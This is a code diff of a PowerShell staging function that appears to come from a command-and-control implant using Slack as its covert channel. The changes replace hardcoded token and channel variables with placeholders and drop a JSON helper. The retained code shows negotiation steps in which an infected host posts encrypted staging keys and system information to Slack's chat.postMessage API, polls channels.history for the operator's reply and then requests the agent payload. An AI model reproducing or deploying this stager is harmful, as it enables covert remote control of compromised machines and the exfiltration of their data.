@@ -1,13 +1,6 @@
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
 
-
-    function ConvertTo-Json20([object] $item){
-        add-type -assembly system.web.extensions
-        $ps_js=new-object system.web.script.serialization.javascriptSerializer
-        return $ps_js.Serialize($item)
-    }
-
     function ConvertFrom-Json20([object] $item){ 
         add-type -assembly system.web.extensions
         $ps_js=new-object system.web.script.serialization.javascriptSerializer
@@ -163,7 +156,7 @@ function Start-Negotiate {
 
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
     $rc4p_base64=Encode-Base64 $rc4p
-    $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=$Token&channel=$Channel&text=$rc4p_base64&username=$ID:3");
+    $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p_base64&username=$ID:3");
     $thread_ts=(ConvertFrom-Json20 $slack_response).ts
 
     # wait for listener to respond before proceeding
@@ -173,7 +166,7 @@ function Start-Negotiate {
         $listener_replied=$false
 
         $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded')
-        $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=$Token&channel=$slack_channel&oldest=$thread_ts')
+        $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&oldest=$thread_ts')
         $slack_response2=ConvertFrom-Json20 $slack_response2
 
         if($slack_response2.messages.count -ne 0) {
@@ -275,7 +268,7 @@ function Start-Negotiate {
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
     $rc4p2_base64=Encode-Base64 $rc4p2
     $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded')
-    $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=$Token&channel=$Channel&text=$rc4p2_base64&username=$ID:5");
+    $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p2_base64&username=$ID:5");
     $thread_ts=(ConvertFrom-Json20 $slack_response).ts
 
     # wait for listener to respond before proceeding
@@ -285,7 +278,7 @@ function Start-Negotiate {
         $listener_replied=$false
 
         $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded')
-        $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=$Token&channel=$slack_channel&oldest=$thread_ts')
+        $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&oldest=$thread_ts')
         $slack_response2=ConvertFrom-Json20 $slack_response2
 
         if($slack_response2.messages.count -ne 0) {
